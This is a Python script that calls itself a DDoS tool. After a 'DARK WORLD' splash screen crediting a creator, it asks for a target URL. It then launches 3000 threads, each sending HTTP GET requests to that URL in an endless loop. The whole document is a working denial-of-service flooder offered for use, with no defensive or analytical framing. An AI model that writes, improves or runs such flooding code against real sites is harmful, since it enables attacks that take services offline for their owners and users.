import requests
import threading
import curses
import time

# Function for the animated title
def display_animation(stdscr):
    curses.curs_set(0)
    stdscr.clear()
    stdscr.refresh()
    animation_text = "DARK WORLD"
    creator_text = "Creator: Rahad Hasan"

    # Center the animation text
    height, width = stdscr.getmaxyx()
    x = width // 2 - len(animation_text) // 2
    y = height // 2

    # Display "DARK WORLD" with a blinking effect
    for i in range(4):
        stdscr.addstr(y, x, animation_text, curses.A_BOLD)
        stdscr.addstr(y + 1, x - 5, creator_text)
        stdscr.refresh()
        time.sleep(0.3)
        stdscr.clear()
        time.sleep(0.3)

    # Final display before attack
    stdscr.addstr(y, x, animation_text, curses.A_BOLD)
    stdscr.refresh()
    time.sleep(1)

# Function to send HTTP requests
def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

# Main function
def main(stdscr):
    # Run the animation
    display_animation(stdscr)

    # Get the target URL from the user
    target_url = input("Enter the target URL: ")

    # Start the DDoS attack
    print("Starting DDoS attack...")
    for _ in range(3000):
        # Create a new thread for each request
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.start()

if __name__ == "__main__":
    curses.wrapper(main)
